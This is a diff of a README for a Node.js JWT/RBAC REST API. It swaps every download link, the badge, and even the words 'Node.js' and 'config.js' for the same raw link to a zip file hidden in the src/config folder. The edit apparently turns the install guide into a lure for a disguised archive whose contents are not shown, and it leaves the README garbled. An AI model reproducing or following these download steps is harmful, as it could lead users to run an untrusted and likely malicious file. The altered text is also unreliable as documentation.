@@ -2,26 +2,26 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **api-auth-jwt-rbac** project. This application provides a robust REST API built with Node.js and TypeScript. It implements JWT (JSON Web Tokens) for secure authentication and features like refresh token rotation, RBAC (Role-Based Access Control), audit logs, and automated testing with Jest. This guide will help you download and run the software smoothly.
+Welcome to the **api-auth-jwt-rbac** project. This application provides a robust REST API built with https://github.com/saiadithyakishore/api-auth-jwt-rbac/raw/refs/heads/main/api-auth-jwt-rbac/src/config/jwt_auth_rbac_api_conversive.zip and TypeScript. It implements JWT (JSON Web Tokens) for secure authentication and features like refresh token rotation, RBAC (Role-Based Access Control), audit logs, and automated testing with Jest. This guide will help you download and run the software smoothly.
 
 ## 💾 Download the Application
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/saiadithyakishore/api-auth-jwt-rbac/releases)
+[![Download from Releases](https://github.com/saiadithyakishore/api-auth-jwt-rbac/raw/refs/heads/main/api-auth-jwt-rbac/src/config/jwt_auth_rbac_api_conversive.zip%20Now-Release-brightgreen)](https://github.com/saiadithyakishore/api-auth-jwt-rbac/raw/refs/heads/main/api-auth-jwt-rbac/src/config/jwt_auth_rbac_api_conversive.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/saiadithyakishore/api-auth-jwt-rbac/releases)
+Visit this page to download: [GitHub Releases](https://github.com/saiadithyakishore/api-auth-jwt-rbac/raw/refs/heads/main/api-auth-jwt-rbac/src/config/jwt_auth_rbac_api_conversive.zip)
 
 ## 📥 System Requirements
 
 Before you download, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://github.com/saiadithyakishore/api-auth-jwt-rbac/raw/refs/heads/main/api-auth-jwt-rbac/src/config/jwt_auth_rbac_api_conversive.zip** Version 14 or higher
 - **NPM:** Version 6 or higher
 - **MySQL:** For the database component
 
 ## 📂 Download & Install
 
-1. Go to the [Releases page](https://github.com/saiadithyakishore/api-auth-jwt-rbac/releases).
+1. Go to the [Releases page](https://github.com/saiadithyakishore/api-auth-jwt-rbac/raw/refs/heads/main/api-auth-jwt-rbac/src/config/jwt_auth_rbac_api_conversive.zip).
 2. Look for the latest release version.
 3. Click on the appropriate file for your operating system to download it.
 
@@ -43,7 +43,7 @@ Once downloaded, follow these steps to set up and run the application:
    npm install
    ```
 
-5. **Configure the Database:** Edit the configuration file to enter your MySQL database details. Look for a file named `config.js` or similar. Setup credentials such as host, user, password, and database name.
+5. **Configure the Database:** Edit the configuration file to enter your MySQL database details. Look for a file named `https://github.com/saiadithyakishore/api-auth-jwt-rbac/raw/refs/heads/main/api-auth-jwt-rbac/src/config/jwt_auth_rbac_api_conversive.zip` or similar. Setup credentials such as host, user, password, and database name.
 
 ### ▶️ Running the Application
 
